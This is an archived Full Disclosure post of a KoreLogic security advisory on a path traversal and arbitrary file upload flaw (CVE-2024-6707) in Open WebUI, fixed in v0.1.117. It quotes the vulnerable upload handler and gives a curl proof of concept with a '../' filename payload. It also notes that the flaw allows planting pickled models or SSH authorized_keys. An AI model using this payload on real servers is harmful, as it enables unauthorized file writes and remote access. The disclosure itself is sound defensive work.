---
title: KL-001-2024-006: Open WebUI Arbitrary File Upload + Path	Traversal
url: https://seclists.org/fulldisclosure/2024/Aug/4
source: Full Disclosure
date: 2024-08-08
fetch_date: 2025-10-06T18:08:52.301116
---

# KL-001-2024-006: Open WebUI Arbitrary File Upload + Path	Traversal

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

![](/shared/images/nst-icons.svg#search)

# KL-001-2024-006: Open WebUI Arbitrary File Upload + Path Traversal

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 7 Aug 2024 18:49:23 -0500

---

```
KL-001-2024-006: Open WebUI Arbitrary File Upload + Path Traversal

Title: Open WebUI Arbitrary File Upload + Path Traversal
Advisory ID: KL-001-2024-006
Publication Date: 2024.08.D06
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-006.txt

1. Vulnerability Details

     Affected Vendor: Open WebUI
     Affected Product: Open WebUI
     Affected Version: 0.1.105
     Platform: Debian 12
     CWE Classification: CWE-22: Improper Limitation of a Pathname to a
                         Restricted Directory ('Path Traversal'),
                         CWE-434: Unrestricted Upload of File with Dangerous
                         Type
     CVE ID: CVE-2024-6707

2. Vulnerability Description

     Attacker controlled files can be uploaded to arbitrary
     locations on the web server's filesystem by abusing a
     path traversal vulnerability.

3. Technical Description

   When attaching files to a prompt by clicking the
   plus sign (+) on the left of the message input box
   when using the Open WebUI HTTP interface, the file
   is uploaded to a static upload directory.

   The name of the file is derived from the original
   HTTP upload request and is not validated or sanitized.
   This allows for users to upload files with names
   containing dot-segments in the file path and traverse
   out of the intended uploads directory. Effectively, users
   can upload files anywhere on the filesystem the
   user running the web server has permission.

   This can be visualized by examining the python code
   for the "/rag/api/v1/doc" API route:

      @app.post("/doc")
      def store_doc(
          collection_name: Optional[str] = Form(None),
          file: UploadFile = File(...),
          user=Depends(get_current_user),
      ):
          # "https://www.gutenberg.org/files/1727/1727-h/1727-h.htm";

          print(file.content_type)
          try:
              filename = file.filename
              file_path = f"{UPLOAD_DIR}/{filename}"
              contents = file.file.read()
              with open(file_path, "wb") as f:
                  f.write(contents)
                  f.close()

   The "file" variable is a representation of the multipart
   form data contained within the HTTP POST request. The
   "filename" variable is derived from the uploaded file name
   and is not validated before writing the file contents
   to disk.

    This can be used to upload malicious models. These models
    are often distributed as pickled python objects and can
    be leveraged to execute arbitrary python bytecode once
    deserialized. Alternatively, an attacker can leverage existing
    services, such as SSH, to upload an attacker controlled
    "authorized_keys" file to remotely connect to the machine.

4. Mitigation and Remediation Recommendation

     This issue was remediated in Open WebUI release v0.1.117 on 2024.04.03.

5. Credit

     This vulnerability was discovered by Jaggar Henry and Sean
     Segreti of KoreLogic, Inc.

6. Disclosure Timeline

     2024.03.05 - KoreLogic requests secure communications channel and point
                  of contact from OpenWebUI.com via email.
     2024.03.12 - KoreLogic submits vulnerability details and suggested patch
                  to maintainer via Github Security 'Report a vulnerability'
                  web form.
     2024.04.01 - KoreLogic opens Discussion #1385 via GitHub to request an
                  update from the maintainer.
     2024.04.01 - Maintainer opens a private fork and merges KoreLogic's patch.
     2024.04.03 - Maintainer releases v0.1.117.
     2024.08.06 - KoreLogic public disclosure.

7. Proof of Concept

   Execute the following cURL command:

      TARGET_URI='https://redacted.com';; JWT='redacted'; LOCAL_FILE='/tmp/file_to_upload.txt'\
```

      curl -H "Authorization: Bearer $JWT" -F "file=$LOCAL\_FILE;filename=../../../../../../../../../../tmp/pwned.txt"
"$TARGET\_URI/rag/api/v1/doc"

```
   Verify the file "pwned.txt" exists in the /tmp/ directory on
   the machine hosting the web server:

      ollama@webserver:~$ cat /tmp/pwned.txt
      korelogic
      ollama@webserver:~$

The contents of this advisory are copyright(c) 2024
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
```

**Attachment:
[OpenPGP\_signature.asc](att-4/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

### Current thread:

* **KL-001-2024-006: Open WebUI Arbitrary File Upload + Path Traversal** *KoreLogic Disclosures via Fulldisclosure (Aug 07)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap ...